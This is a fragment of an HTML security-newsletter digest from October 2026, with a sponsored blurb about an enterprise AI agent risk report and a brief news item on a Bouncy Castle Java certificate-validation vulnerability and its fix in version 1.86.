+            <h2><a href="https://airia.com/resources/the-state-of-enterprise-ai-risk/?utm_source=tldrinfosec&amp;amp;utm_medium=newsletter&amp;amp;utm_campaign=1006thestateofenterpriseai&amp;amp;utm_content=header_when_ai_agents&amp;amp;utm_term=2026-10-06">When AI agents make the wrong call, few can reconstruct what happened (Sponsor)</a></h2>
+            <time datetime="2026-10-06T00:00:00.000Z">2026-10-06T00:00:00.000Z</time>
+            <p>That&#039;s because agents break tools built for humans. To govern them, you need to get clarity about the 5 sources of enterprise AI risk.Airia&#039;s State of Enterprise AI Risk report explains how:Ungoverned AI is the risk that compounds every other oneModel risk does not end at deploymentVendor-embedded agents can access enterprise systems without appearing in your inventoryMost organizations cannot say who approved an agent&#039;s decision, or who was responsible for the policy behind itDownload your report</p>
+        </article>
+        <article>
+            <h2><a href="https://forkast.news/bouncy-castle-cve-2026-71885-harvested-the-credential-binding-that-authenticates-agent-to-agent-channels?utm_source=tldrinfosec">Bouncy Castle CVE-2026-71885 Harvested the Credential Binding That Authenticates Agent-to-Agent Channels (2 minute read)</a></h2>
+            <time datetime="2026-10-06T00:00:00.000Z">2026-10-06T00:00:00.000Z</time>
+            <p>A critical vulnerability in Bouncy Castle for Java versions before 1.86 lets attackers spoof legitimate participants and decrypt messages within Messaging Layer Security groups. Improper certificate validation in the protocol implementation lets threat actors bypass core security objectives by presenting arbitrary credentials. Developers must upgrade to version 1.86 to enforce cryptographic binding between end-entity certificates and LeafNode signature keys.</p>
+        </article>
+    </main>
+    <footer>
+        <p>Generated on 2026-10-09T17:35:04.391Z</p>
+    </footer>
+</body>
+</html>
